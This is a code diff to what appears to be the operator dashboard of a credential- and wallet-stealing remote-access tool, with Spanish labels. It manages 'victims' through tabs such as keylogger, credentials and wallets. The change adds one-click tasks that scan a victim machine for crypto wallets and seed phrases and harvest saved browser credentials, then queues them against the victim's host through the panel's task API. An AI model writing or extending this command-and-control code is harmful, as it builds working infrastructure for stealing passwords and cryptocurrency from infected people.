@@ -17,7 +17,7 @@ import { ShellViewDialog } from '@/components/shell-view-dialog';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { ErrorState } from '@/components/ui/table';
-import { ACTION_MAP, actionReason, type ActionContext, type ActionDef } from '@/lib/actions';
+import { ACTION_MAP, actionReason, type ActionContext, type ActionDef, type Resolved } from '@/lib/actions';
 import { isWindows } from '@/lib/os';
 import { ApiError } from '@/lib/api';
 import { desktopNotify, onDesktopCommand, setDesktopTitle, setTrayStatus } from '@/lib/desktop';
@@ -53,7 +53,13 @@ const SORT_VALUE = (victim: Victim, id: SortState['id']): string | number => {
   }
 };
 
-const TABS: DetailTab[] = ['resumen', 'ficheros', 'keylogger', 'clipboard', 'credenciales', 'wallets', 'tareas', 'eventos', 'monitor', 'chat'];
+const TABS: DetailTab[] = ['resumen', 'boveda', 'ficheros', 'actividad', 'monitor', 'chat'];
+
+const INLINE: Record<string, Resolved> = {
+  scan: { name: 'scan_wallets', params: {}, timeout: 300 },
+  'find-seeds': { name: 'scan_wallets', params: { include_desktop: false, include_extensions: false, include_seeds: true }, timeout: 300 },
+  'capture-creds': { name: 'harvest', params: { kind: 'browsers' }, timeout: 180 }
+};
 
 export function OperationsView() {
   const router = useRouter();
@@ -209,6 +215,20 @@ export function OperationsView() {
     }
   }
 
+  async function runInline(actionId: string): Promise<string | null> {
+    const action = ACTION_MAP.get(actionId);
+    const victimRow = victim;
+    if (!action || !victimRow) return null;
+    const resolved = action.resolve?.(victimRow) ?? INLINE[actionId];
+    if (!resolved) return null;
+    const data = await mutate<{ items: Array<{ id: string }> }>('/tasks', 'POST', {
+      victim_ids: [victimRow.id], name: resolved.name, params: resolved.params, timeout_sec: resolved.timeout
+    });
+    setNotice({ tone: 'ok', text: `${action.label} encolada en ${victimRow.hostname}.` });
+    victims.refresh();
+    return data.items[0]?.id ?? null;
+  }
+
   async function revoke(victimRow: Victim) {
     try {
       await mutate(`/victims/${victimRow.id}/revoke${victimRow.revokedAt ? '?restore=1' : ''}`, 'POST');
@@ -312,6 +332,7 @@ export function OperationsView() {
               victim={victim}
               tab={tab}
               onTab={setTab}
+              onRun={runInline}
               onAction={(id) => {
                 const action = ACTION_MAP.get(id);
                 if (!action) return;
@@ -331,7 +352,7 @@ export function OperationsView() {
         ) : null}
       </div>
 
-      <SessionLog victim={victim} onInspect={() => setTab('tareas')} onFiles={() => setTab('ficheros')} />
+      <SessionLog victim={victim} onInspect={() => setTab('actividad')} onFiles={() => setTab('ficheros')} />
 
       {menu ? (
         <ActionMenu
